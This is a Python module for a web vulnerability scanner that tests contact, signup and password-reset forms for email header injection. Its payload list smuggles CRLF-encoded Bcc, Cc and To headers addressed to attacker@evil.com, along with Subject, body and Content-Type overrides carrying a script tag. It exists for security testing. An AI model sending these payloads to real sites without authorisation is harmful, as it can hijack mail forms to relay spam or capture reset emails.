import re
from urllib.parse import urljoin, urlparse
from modules.base import BaseModule

class EmailinjectModule(BaseModule):
    name = "emailinject"
    description = "Email Header Injection (CRLF in email-sending forms) Scanner"

    form_paths = [
        "/contact", "/contact-us", "/contactus", "/feedback", "/support",
        "/forgot-password", "/reset-password", "/password/forgot",
        "/signup", "/register", "/subscribe", "/newsletter",
        "/invite", "/share", "/report", "/report-abuse",
        "/api/contact", "/api/feedback", "/api/support",
    ]

    email_header_payloads = [
        ("%0d%0aBcc: attacker@evil.com", "Bcc"),
        ("%0d%0aCc: attacker@evil.com", "Cc"),
        ("%0d%0aTo: attacker@evil.com", "To"),
        ("%0d%0aSubject: Injected", "Subject"),
        ("%0d%0aX-Custom: injected", "X-Custom"),
        ("%0aBcc: attacker@evil.com", "Bcc (LF)"),
        ("%0d%0a%0d%0aBody override", "Double CRLF body"),
        ("\r\nBcc: attacker@evil.com", "Bcc raw CRLF"),
        ("%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>", "Content-Type override"),
    ]

    async def scan(self, target):
        self.findings = []
        parsed = urlparse(target)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        await self._scan_contact_forms(base_url, target)
        await self._scan_reset_forms(base_url)
        return self.findings

    async def _scan_contact_forms(self, base_url, target):
        urls_to_check = [target] + [urljoin(base_url, p) for p in self.form_paths]
        for url in urls_to_check:
            resp = await self.http.get(url)
            if resp.get("status") != 200:
                continue
            forms = self._find_email_forms(resp.get("text", ""))
            for form_info in forms:
                action = form_info.get("action") or url
                if not action.startswith("http"):
                    action = urljoin(url, action)
                params = form_info.get("params", [])
                for param in params:
                    for payload, header_name in self.email_header_payloads[:6]:
                        post_data = {p: "test" for p in params if p != param}
                        post_data[param] = f"legit@test.com{payload}"
                        r = await self.http.post(action, data=post_data)
                        if not r.get("status"):
                            continue
                        if self._indicates_injection(r, header_name, payload):
                            self.add_finding(
                                "HIGH",
                                f"Email header injection in {param} ({header_name})",
                                url=action,
                                parameter=param,
                                evidence=f"Payload: {payload[:50]}..."
                            )
                            return

    def _find_email_forms(self, html):
        forms = []
        for m in re.finditer(r'<form[^>]*>.*?</form>', html, re.DOTALL | re.IGNORECASE):
            form_block = m.group(0)
            if not re.search(r'email|contact|feedback|message|body', form_block, re.I):
                continue
            action = re.search(r'action=["\']?([^"\'>\s]*)', form_block, re.I)
            inputs = re.findall(r'<input[^>]+name=["\']?([^"\'>\s]+)', form_block, re.I)
            textareas = re.findall(r'<textarea[^>]+name=["\']?([^"\'>\s]+)', form_block, re.I)
            params = list(dict.fromkeys(inputs + textareas))
            if params:
                forms.append({"action": action.group(1) if action else "", "params": params})
        return forms

    def _indicates_injection(self, resp, header_name, payload):
        if resp.get("status") in [500, 502]:
            return True
        text = (resp.get("text") or "").lower()
        if "bcc" in text and "attacker@evil.com" in text:
            return True
        if "mailer" in text and "error" in text and ("bcc" in payload.lower() or "cc" in payload.lower()):
            return True
        return False

    async def _scan_reset_forms(self, base_url):
        for path in ["/forgot-password", "/reset-password", "/password/forgot"]:
            url = urljoin(base_url, path)
            resp = await self.http.get(url)
            if resp.get("status") != 200:
                continue
            email_param = self._guess_email_param(resp.get("text", ""))
            if not email_param:
                continue
            form_action = re.search(r'<form[^>]+action=["\']?([^"\'>\s]+)', resp.get("text", ""), re.I)
            post_url = urljoin(url, form_action.group(1)) if form_action else url
            for payload, header_name in self.email_header_payloads[:4]:
                r = await self.http.post(post_url, data={email_param: f"user@test.com{payload}"})
                if r.get("status") and self._indicates_injection(r, header_name, payload):
                    self.add_finding(
                        "HIGH",
                        f"Password reset email header injection ({header_name})",
                        url=post_url,
                        parameter=email_param,
                        evidence=f"Payload: {payload[:40]}..."
                    )
                    return

    def _guess_email_param(self, html):
        for name in ["email", "username", "user", "login"]:
            if re.search(rf'name=["\']?{name}["\']?', html, re.I):
                return name
        return None
